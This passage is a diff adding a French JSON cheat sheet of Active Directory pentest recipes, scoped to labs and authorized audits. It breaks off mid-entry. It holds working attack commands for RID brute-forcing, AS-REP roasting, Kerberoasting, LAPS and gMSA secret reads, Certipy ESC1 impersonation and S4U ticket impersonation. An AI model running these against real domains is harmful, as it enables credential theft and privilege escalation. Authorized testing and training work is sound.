@@ -1,0 +1,2201 @@
+{
+  "meta": {
+    "name": "AD Pentest Companion",
+    "version": "0.3.0",
+    "updated": "2026-11-23",
+    "language": "fr",
+    "scope": "Environnements de laboratoire, CTF et audits explicitement autorisés",
+    "disclaimer": "Référence portable de laboratoire. Bibliothèque augmentée à partir des guides existants, generalized private-lab findings et sources AD105. Commandes revues pour leur intention et non validées de bout en bout sur un domaine réel. Confirmer --help et versions locales."
+  },
+  "sources": {
+    "nxc": "https://www.netexec.wiki/",
+    "nxc-ldap": "https://www.netexec.wiki/ldap-protocol/enumerate-users",
+    "nxc-smb": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+    "impacket": "https://github.com/fortra/impacket/tree/master/examples",
+    "kerbrute": "https://github.com/ropnop/kerbrute",
+    "ldap": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+    "bh": "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart",
+    "rusthound": "https://github.com/g0h4n/RustHound-CE/blob/main/HELP.md",
+    "certipy": "https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage",
+    "certipy-esc": "https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation",
+    "bloody": "https://github.com/CravateRouge/bloodyAD/wiki/User-Guide",
+    "ms": "https://learn.microsoft.com/en-us/windows-server/get-started/whats-new-windows-server-2025",
+    "smb": "https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing",
+    "dmsa": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview",
+    "admodule": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/",
+    "pwsh": "https://learn.microsoft.com/en-us/powershell/",
+    "pywhisker": "https://github.com/ShutdownRepo/pywhisker"
+  },
+  "recipes": [
+    {
+      "id": "scan-ad",
+      "title": "Scan des ports AD",
+      "phase": "Recon",
+      "tool": "nmap",
+      "command": "nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985,5986 {{target}}",
+      "summary": "Cartographier rapidement les services typiques d’un DC ou d’un serveur membre.",
+      "requires": "IP ou nom cible dans un lab autorisé.",
+      "reading": "88 + 389 + 445 évoquent un DC; 5985 indique WinRM accessible, pas un droit de shell.",
+      "next": "Identifier le domaine et le rôle de l’hôte.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "scan-all",
+      "title": "Scan TCP complet",
+      "phase": "Recon",
+      "tool": "nmap",
+      "command": "nmap -Pn -p- --min-rate 1000 {{target}}",
+      "summary": "Ne pas manquer un service non standard.",
+      "requires": "Le taux doit être adapté à la charge et aux règles du lab.",
+      "reading": "Comparer avec les ports standards; confirmer les services avec -sV.",
+      "next": "Relancer un scan ciblé de versions.",
+      "risk": "bruyant",
+      "source": "https://nmap.org/book/man.html",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "scan-targeted",
+      "title": "Versions et scripts de base",
+      "phase": "Recon",
+      "tool": "nmap",
+      "command": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,636,5985 {{target}}",
+      "summary": "Affiner l’identification des services AD sans scanner tout le réseau.",
+      "requires": "Les scripts NSE actifs peuvent générer des requêtes supplémentaires.",
+      "reading": "Relever domaine, SPN, système et versions.",
+      "next": "Vérifier DNS et LDAP RootDSE.",
+      "risk": "bruyant",
+      "source": "https://nmap.org/book/man.html",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "dns-srv",
+      "title": "Enregistrements SRV Kerberos/LDAP",
+      "phase": "Recon",
+      "tool": "dig",
+      "command": "dig @{{target}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short; dig @{{target}} _kerberos._tcp.{{domain}} SRV +short",
+      "summary": "Retrouver les noms des DC à partir de DNS.",
+      "requires": "Connaître le nom DNS du domaine.",
+      "reading": "Une réponse vide peut indiquer un problème DNS ou de domaine, pas une absence d’AD.",
+      "next": "Ajouter une résolution fiable au laboratoire.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/dns-records-not-present",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "dns-ns",
+      "title": "Résolution du DC",
+      "phase": "Recon",
+      "tool": "dig",
+      "command": "dig @{{target}} {{dcHost}} A +short; getent hosts {{dcHost}}",
+      "summary": "Comparer la réponse du DNS AD et du résolveur local Kali.",
+      "requires": "Nom complet du contrôleur de domaine.",
+      "reading": "Des réponses divergentes provoquent des erreurs Kerberos et BloodHound.",
+      "next": "Corriger DNS avant de lancer les collecteurs.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/get-started/whats-new-windows-server-2025",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "rootdse",
+      "title": "LDAP RootDSE anonyme",
+      "phase": "Sans creds",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -s base -b \"\" defaultNamingContext namingContexts dnsHostName supportedLDAPVersion",
+      "summary": "Identifier la base DN et le domaine sans liste d’utilisateurs.",
+      "requires": "Port LDAP joignable; réponse RootDSE dépend de la configuration.",
+      "reading": "La RootDSE peut répondre même quand la recherche anonyme d’utilisateurs est interdite.",
+      "next": "Construire baseDn pour les filtres LDAP.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "smb-null",
+      "title": "SMB : partages en session anonyme",
+      "phase": "Sans creds",
+      "tool": "smbclient",
+      "command": "smbclient -L //{{target}} -N",
+      "summary": "Tester l’énumération sans mot de passe via SMB.",
+      "requires": "SMB ouvert; accès anonyme éventuellement restreint.",
+      "reading": "Session anonyme, compte Guest et identifiants vides sont des situations distinctes.",
+      "next": "Tester éventuellement l’accès Guest séparément.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "smb-guest",
+      "title": "SMB : partages Guest",
+      "phase": "Sans creds",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -u guest -p \"\" --shares",
+      "summary": "Tester les permissions Guest si autorisé par le serveur.",
+      "requires": "Guest doit pouvoir s’authentifier; cela ne donne pas automatiquement accès aux fichiers.",
+      "reading": "Noter les permissions READ/WRITE sans confondre succès d’auth et accès.",
+      "next": "Visiter les seuls partages réellement lisibles.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "smb-empty",
+      "title": "SMB : identifiants vides",
+      "phase": "Sans creds",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -u \"\" -p \"\" --shares",
+      "summary": "Comparer la session aux chaînes vides avec Guest et anonymous.",
+      "requires": "SMB accessible; Windows moderne peut refuser.",
+      "reading": "Un succès de connexion ne signifie pas que RID cycling ou tous les partages fonctionneront.",
+      "next": "Rechercher des informations RPC si les partages sont refusés.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "rpc-null",
+      "title": "RPC : session anonyme",
+      "phase": "Sans creds",
+      "tool": "rpcclient",
+      "command": "rpcclient -U \"\" -N {{target}} -c \"enumdomusers; enumdomgroups; querydominfo\"",
+      "summary": "Rechercher des utilisateurs, groupes ou identifiants de domaine via SAMR.",
+      "requires": "Accès RPC/SAMR permis sans authentification : rare sur les configurations durcies.",
+      "reading": "ACCESS_DENIED est normal; changer de source plutôt que forcer la même méthode.",
+      "next": "Comparer les informations obtenues avec LDAP.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "rid-null",
+      "title": "RID cycling sans identifiants",
+      "phase": "Sans creds",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -u \"\" -p \"\" --rid-brute 3000",
+      "summary": "Tenter de résoudre les RID exposés par SAMR.",
+      "requires": "Le serveur doit permettre la résolution des SID avec les droits disponibles.",
+      "reading": "Ce n’est pas une liste garantie de tous les comptes du domaine.",
+      "next": "Constituer une liste de noms validés.",
+      "risk": "bruyant",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "kerbrute-userenum",
+      "title": "Kerberos : validation des noms",
+      "phase": "Sans creds",
+      "tool": "kerbrute",
+      "command": "kerbrute userenum --dc {{target}} -d {{domain}} {{usersFile}}",
+      "summary": "Valider les noms candidats sans disposer de mots de passe.",
+      "requires": "KDC joignable, domaine connu, liste préexistante.",
+      "reading": "Les réponses et la visibilité dépendent de la configuration Kerberos; requêtes traçables.",
+      "next": "Chercher les comptes sans préauthentification.",
+      "risk": "bruyant",
+      "source": "https://github.com/ropnop/kerbrute",
+      "tags": [
+        "sans-creds"
+      ]
+    },
+    {
+      "id": "asrep",
+      "title": "AS-REP roasting : requêtes",
+      "phase": "Identités",
+      "tool": "Impacket",
+      "command": "impacket-GetNPUsers {{domain}}/ -usersfile {{usersFile}} -no-pass -dc-ip {{target}} -request -format hashcat -outputfile asrep.hashes",
+      "summary": "Demander des AS-REP pour comptes sans préauth Kerberos.",
+      "requires": "Domaine et liste d’utilisateurs; compte cible configuré DONT_REQ_PREAUTH.",
+      "reading": "Aucun résultat ne prouve pas que la liste de comptes soit exhaustive.",
+      "next": "Analyser hors ligne seulement les tickets renvoyés.",
+      "risk": "bruyant",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "sans-creds",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "nxc-smb-shares",
+      "title": "SMB : partages authentifiés",
+      "phase": "Identités",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -d {{domain}} -u {{user}} -p {{password}} --shares",
+      "summary": "Lister les partages et les droits du compte utilisé.",
+      "requires": "Identifiants de domaine valides; SMB joignable.",
+      "reading": "READ/WRITE correspond au compte, pas nécessairement à tous les groupes.",
+      "next": "Explorer SYSVOL/NETLOGON et partages métier.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "nxc-passpol",
+      "title": "Politique de mots de passe",
+      "phase": "Identités",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -d {{domain}} -u {{user}} -p {{password}} --pass-pol",
+      "summary": "Comprendre le lockout et le contexte des comptes.",
+      "requires": "Un compte autorisé à lire la politique de domaine.",
+      "reading": "Les Fine-Grained Password Policies peuvent modifier les seuils selon le compte.",
+      "next": "Éviter tout spray tant que les seuils ne sont pas vérifiés.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "nxc-ldap-users",
+      "title": "LDAP : utilisateurs",
+      "phase": "Identités",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -d {{domain}} -u {{user}} -p {{password}} --users",
+      "summary": "Inventorier les utilisateurs du domaine.",
+      "requires": "LDAP joignable, authentification réussie.",
+      "reading": "Un compte valide ne garantit pas un accès WinRM.",
+      "next": "Relever descriptions, SPN et appartenances.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/ldap-protocol/enumerate-users",
+      "tags": [
+        "avec-creds",
+        "ldap"
+      ]
+    },
+    {
+      "id": "nxc-ldap-groups",
+      "title": "LDAP : groupes",
+      "phase": "Identités",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -d {{domain}} -u {{user}} -p {{password}} --groups",
+      "summary": "Lister les groupes et préparer une analyse des appartenances.",
+      "requires": "LDAP accessible avec authentification.",
+      "reading": "Les appartenances indirectes doivent être remontées via le graphe.",
+      "next": "Collecter dans BloodHound CE.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "ldap"
+      ]
+    },
+    {
+      "id": "ldap-users",
+      "title": "LDAP : attributs utilisateurs",
+      "phase": "Identités",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(&(objectCategory=person)(objectClass=user))\" sAMAccountName description memberOf userAccountControl",
+      "summary": "Rechercher utilisateurs et descriptions sensibles.",
+      "requires": "Compte LDAP, Base DN exacte; simple bind en clair déconseillé hors lab isolé.",
+      "reading": "Les attributs retournés dépendent des permissions de lecture.",
+      "next": "Vérifier si l’environnement impose LDAPS ou SASL signé.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "ldap"
+      ]
+    },
+    {
+      "id": "ldap-spn",
+      "title": "LDAP : comptes de service SPN",
+      "phase": "Kerberos",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(&(objectClass=user)(servicePrincipalName=*))\" sAMAccountName servicePrincipalName",
+      "summary": "Identifier les comptes utilisateurs possédant des SPN.",
+      "requires": "Lecture LDAP possible; la présence d’un SPN seule ne suffit pas à casser un secret.",
+      "reading": "Un compte machine possède souvent un SPN, mais n’est pas une cible faible par défaut.",
+      "next": "Évaluer Kerberoasting sur comptes réellement pertinents.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "kerberoast",
+      "title": "Kerberoasting : comptes SPN",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "impacket-GetUserSPNs {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -request -outputfile kerberoast.hashes",
+      "summary": "Demander des tickets de service pour audit hors ligne des secrets.",
+      "requires": "Compte domaine valide, SPN sur le compte cible.",
+      "reading": "RC4 n’est pas garanti; type de chiffrement et politique Kerberos influent sur le format du ticket.",
+      "next": "Vérifier le format retourné avant tout traitement hors ligne.",
+      "risk": "bruyant",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "avec-creds",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "nxc-userdesc",
+      "title": "Descriptions d’utilisateurs",
+      "phase": "Identités",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -u {{user}} -p {{password}} -d {{domain}} -M user-desc",
+      "summary": "Repérer les descriptions LDAP contenant des indices ou mauvaises pratiques.",
+      "requires": "Module NetExec présent; droits de lecture LDAP.",
+      "reading": "Une description peut être trompeuse ou périmée.",
+      "next": "Vérifier les indices contre les ressources réelles.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "ldap"
+      ]
+    },
+    {
+      "id": "smb-sysvol",
+      "title": "SMB : SYSVOL",
+      "phase": "Partages",
+      "tool": "smbclient",
+      "command": "smbclient //{{target}}/SYSVOL -U {{domain}}/{{user}}%{{password}}",
+      "summary": "Explorer GPO, scripts de connexion et artefacts de déploiement.",
+      "requires": "Accès SMB authentifié, SYSVOL publié.",
+      "reading": "La présence de GPP XML n’implique pas un mot de passe encore exploitable.",
+      "next": "Examiner XML, scripts et permissions sur GPO.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "smb-netlogon",
+      "title": "SMB : NETLOGON",
+      "phase": "Partages",
+      "tool": "smbclient",
+      "command": "smbclient //{{target}}/NETLOGON -U {{domain}}/{{user}}%{{password}}",
+      "summary": "Explorer scripts de session et répertoires opérationnels.",
+      "requires": "Accès au partage NETLOGON.",
+      "reading": "Conserver les chemins et noms des scripts pour les corréler aux droits GPO.",
+      "next": "Identifier le compte qui exécute les scripts.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "smb-share",
+      "title": "SMB : ouvrir un partage",
+      "phase": "Partages",
+      "tool": "smbclient",
+      "command": "smbclient //{{target}}/{{share}} -U {{domain}}/{{user}}%{{password}}",
+      "summary": "Accès manuel à un partage dont on connaît le nom.",
+      "requires": "Partage existant et droit de lecture.",
+      "reading": "Les permissions peuvent différer selon les répertoires.",
+      "next": "Consulter les fichiers config, scripts et sauvegardes.",
+      "risk": "lecture",
+      "source": "https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/enumeration/enumerate-shares-and-access.md",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "spider",
+      "title": "SMB : spider_plus",
+      "phase": "Partages",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -d {{domain}} -u {{user}} -p {{password}} -M spider_plus",
+      "summary": "Indexer les fichiers visibles via les partages.",
+      "requires": "Module NetExec spider_plus disponible; éviter les collectes excessives.",
+      "reading": "Peut être bruyant et produire un grand volume de résultats.",
+      "next": "Cibler les scripts et configs intéressants.",
+      "risk": "bruyant",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "bh-collect",
+      "title": "BloodHound CE : collecte NetExec",
+      "phase": "Graphe",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -d {{domain}} -u {{user}} -p {{password}} --bloodhound --collection All",
+      "summary": "Recueillir les données relationnelles exploitables par BloodHound.",
+      "requires": "LDAP et DNS fonctionnels; collecteur compatible avec la version de BloodHound CE.",
+      "reading": "Une collecte partielle n’exclut pas une relation exploitable.",
+      "next": "Importer puis examiner chemins depuis comptes contrôlés.",
+      "risk": "bruyant",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "bloodhound"
+      ]
+    },
+    {
+      "id": "rusthound",
+      "title": "RustHound-CE : collecte",
+      "phase": "Graphe",
+      "tool": "RustHound-CE",
+      "command": "rusthound-ce -d {{domain}} -i {{target}} -u {{userUpn}} -p {{password}} -c All -o ./bloodhound -z",
+      "summary": "Collecte CE actuelle, y compris des relations GPO selon version et contexte.",
+      "requires": "RustHound-CE installé; résolution DNS et droits LDAP; versions évolutives.",
+      "reading": "La collecte par sessions/registre varie selon les permissions et services SMB/RPC.",
+      "next": "Comparer les jeux de données avec SharpHound si manques.",
+      "risk": "bruyant",
+      "source": "https://github.com/g0h4n/RustHound-CE/blob/main/HELP.md",
+      "tags": [
+        "avec-creds",
+        "bloodhound"
+      ]
+    },
+    {
+      "id": "bloody-writable",
+      "title": "bloodyAD : objets modifiables",
+      "phase": "Graphe",
+      "tool": "bloodyAD",
+      "command": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p {{password}} get writable",
+      "summary": "Identifier les objets AD sur lesquels le principal possède des droits d’écriture.",
+      "requires": "Accès LDAP authentifié; version bloodyAD moderne.",
+      "reading": "WriteOwner/WriteDACL ne sont pas équivalents à GenericAll.",
+      "next": "Vérifier la portée des ACE et le type exact d’objet.",
+      "risk": "lecture",
+      "source": "https://github.com/CravateRouge/bloodyAD/wiki/User-Guide",
+      "tags": [
+        "avec-creds",
+        "acl"
+      ]
+    },
+    {
+      "id": "ldap-trusts",
+      "title": "LDAP : relations de confiance",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(objectClass=trustedDomain)\" cn trustDirection trustType trustAttributes",
+      "summary": "Lister les objets trustedDomain et attributs de trust.",
+      "requires": "LDAP authentifié; base DN valide.",
+      "reading": "Une relation de trust seule ne donne pas les droits d’administration de l’autre domaine.",
+      "next": "Vérifier sens, portée, SID filtering et permissions effectives.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "trust"
+      ]
+    },
+    {
+      "id": "ldap-rbcd",
+      "title": "LDAP : objets configurés pour RBCD",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)\" dNSHostName sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "summary": "Trouver les objets ayant une délégation RBCD définie.",
+      "requires": "Droits de lecture LDAP; interprétation des descripteurs de sécurité requise.",
+      "reading": "L’attribut est binaire et son existence ne prouve pas le contrôle par ton compte.",
+      "next": "Décoder l’ACL cible dans BloodHound ou outil dédié.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "kerberos",
+        "acl"
+      ]
+    },
+    {
+      "id": "ldap-keycred",
+      "title": "LDAP : Shadow Credentials présentes",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(msDS-KeyCredentialLink=*)\" sAMAccountName msDS-KeyCredentialLink",
+      "summary": "Recenser les objets possédant des Key Credentials.",
+      "requires": "LDAP authentifié; droits de lecture sur les attributs.",
+      "reading": "Un lien existant peut être légitime (Windows Hello for Business).",
+      "next": "Comparer aux appareils attendus et aux modifications récentes.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "kerberos",
+        "acl"
+      ]
+    },
+    {
+      "id": "ldap-preauth",
+      "title": "LDAP : AS-REP roastable",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\" sAMAccountName userAccountControl",
+      "summary": "Repérer les comptes avec DONT_REQ_PREAUTH.",
+      "requires": "Lecture LDAP; compte peut être désactivé ou service.",
+      "reading": "Le filtre vérifie le drapeau UAC, pas la force du mot de passe.",
+      "next": "Comparer à la collecte AS-REP.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "ldap-gpolinks",
+      "title": "LDAP : liens GPO",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(|(objectClass=organizationalUnit)(objectClass=domainDNS))\" distinguishedName gPLink gPOptions",
+      "summary": "Associer OU/domaines aux stratégies de groupe liées.",
+      "requires": "Accès LDAP; il faut aussi inspecter le contenu de SYSVOL.",
+      "reading": "WriteGPLink n’équivaut pas à modification des paramètres de GPO.",
+      "next": "Corréler ordre des liens, héritage, filtrage et droits de modification.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+      "tags": [
+        "avec-creds",
+        "gpo"
+      ]
+    },
+    {
+      "id": "nxc-laps",
+      "title": "Lecture LAPS (autorisation requise)",
+      "phase": "Secrets",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -d {{domain}} -u {{user}} -p {{password}} -M laps",
+      "summary": "Tester si le compte peut lire des données LAPS dans le laboratoire.",
+      "requires": "Droits de lecture LAPS nécessaires; module/version variables.",
+      "reading": "LAPS traditionnel et Windows LAPS utilisent des attributs différents.",
+      "next": "Noter exactement la machine, le format et la portée des droits.",
+      "risk": "sensible",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "secrets"
+      ]
+    },
+    {
+      "id": "nxc-gmsa",
+      "title": "Lecture gMSA (autorisation requise)",
+      "phase": "Secrets",
+      "tool": "NetExec",
+      "command": "nxc ldap {{target}} -d {{domain}} -u {{user}} -p {{password}} --gmsa",
+      "summary": "Interroger les secrets gMSA accessibles au compte.",
+      "requires": "Droits msDS-GroupMSAMembership et support du flag selon version NetExec.",
+      "reading": "Un service gMSA n’est pas automatiquement Domain Admin.",
+      "next": "Évaluer quels services et hôtes utilisent le compte.",
+      "risk": "sensible",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "secrets"
+      ]
+    },
+    {
+      "id": "certipy-find",
+      "title": "Certipy : découverte AD CS",
+      "phase": "AD CS",
+      "tool": "Certipy",
+      "command": "certipy find -u {{userUpn}} -p {{password}} -dc-ip {{target}} -vulnerable -stdout",
+      "summary": "Rechercher les configurations AD CS signalées comme à risque.",
+      "requires": "Certipy installé; un CA peut ne pas être présent dans le domaine.",
+      "reading": "Un résultat ESC est un indice conditionnel, pas une preuve automatique d’élévation.",
+      "next": "Vérifier EKU, SAN, droits d’enrôlement, mappage et correctifs.",
+      "risk": "lecture",
+      "source": "https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage",
+      "tags": [
+        "avec-creds",
+        "adcs"
+      ]
+    },
+    {
+      "id": "certipy-all",
+      "title": "Certipy : inventaire complet",
+      "phase": "AD CS",
+      "tool": "Certipy",
+      "command": "certipy find -u {{userUpn}} -p {{password}} -dc-ip {{target}} -stdout",
+      "summary": "Inventorier CA, templates et propriétés AD CS.",
+      "requires": "LDAP authentifié, Certipy 5.x ou version compatible.",
+      "reading": "Ne pas se limiter au filtre -vulnerable pour comprendre les permissions.",
+      "next": "Relever templates activés, EKU, agents et autorités.",
+      "risk": "lecture",
+      "source": "https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage",
+      "tags": [
+        "avec-creds",
+        "adcs"
+      ]
+    },
+    {
+      "id": "certipy-req-esc1",
+      "title": "Certipy : requête ESC1 en lab",
+      "phase": "AD CS",
+      "tool": "Certipy",
+      "command": "certipy req -u {{userUpn}} -p {{password}} -dc-ip {{target}} -target {{caHost}} -ca {{ca}} -template {{template}} -upn {{targetUpn}} -sid {{sid}}",
+      "summary": "Démonstration d’enrôlement avec identité SAN contrôlée sur template vulnérable.",
+      "requires": "ESC1 vérifié; enrollee supplies subject, EKU approprié, droits d’enrôlement, politique de mapping et SID correct.",
+      "reading": "Une demande peut être refusée ou produite sans permettre une authentification équivalente.",
+      "next": "Conserver Request ID et vérifier le résultat sans modifier d’autres templates.",
+      "risk": "modifie",
+      "source": "https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation",
+      "tags": [
+        "avec-creds",
+        "adcs",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "certipy-auth",
+      "title": "Certipy : authentification PFX",
+      "phase": "AD CS",
+      "tool": "Certipy",
+      "command": "certipy auth -pfx {{cert}} -dc-ip {{target}}",
+      "summary": "Tester l’authentification par certificat en environnement contrôlé.",
+      "requires": "Certificat PFX et clé valides; chaîne de confiance/mapping compatibles.",
+      "reading": "Le ticket ou hash reçu reflète l’identité réellement mappée par le KDC.",
+      "next": "Vérifier expiration, SAN/SID et configuration PKINIT.",
+      "risk": "sensible",
+      "source": "https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage",
+      "tags": [
+        "adcs",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "get-delegation",
+      "title": "Kerberos : découvrir délégations",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "impacket-findDelegation {{domain}}/{{user}}:{{password}} -dc-ip {{target}}",
+      "summary": "Identifier les comptes et machines avec délégation Kerberos.",
+      "requires": "Compte de domaine valide.",
+      "reading": "Différencier TrustedForDelegation, Protocol Transition, RBCD et droits locaux.",
+      "next": "Vérifier SPN et destination avant toute opération S4U.",
+      "risk": "lecture",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "avec-creds",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "getst",
+      "title": "S4U : ticket de service en lab",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "impacket-getST -dc-ip {{target}} -spn {{spn}} -impersonate {{targetUser}} {{domain}}/{{user}}:{{password}}",
+      "summary": "Demander un TGS S4U si délégation et droits sont configurés.",
+      "requires": "Compte délégant contrôlé; SPN autorisé, KDC compatible, utilisateur cible autorisé et configuration S4U appropriée.",
+      "reading": "KDC_ERR_BADOPTION peut signifier prérequis S4U absents, ticket non forwardable ou délégation interdite.",
+      "next": "Vérifier l’attribut de délégation et le SPN précis.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "avec-creds",
+        "kerberos",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "ticket-export",
+      "title": "Kerberos : utiliser ccache",
+      "phase": "Kerberos",
+      "tool": "Shell Linux",
+      "command": "export KRB5CCNAME={{ticket}}; klist",
+      "summary": "Définir le cache de ticket Kerberos pour les outils compatibles.",
+      "requires": "Fichier ccache déjà obtenu de manière autorisée.",
+      "reading": "Le cache n’a pas de valeur si SPN, domaine, date ou droits ne correspondent pas.",
+      "next": "Contrôler le principal et l’expiration avant l’accès Kerberos.",
+      "risk": "lecture",
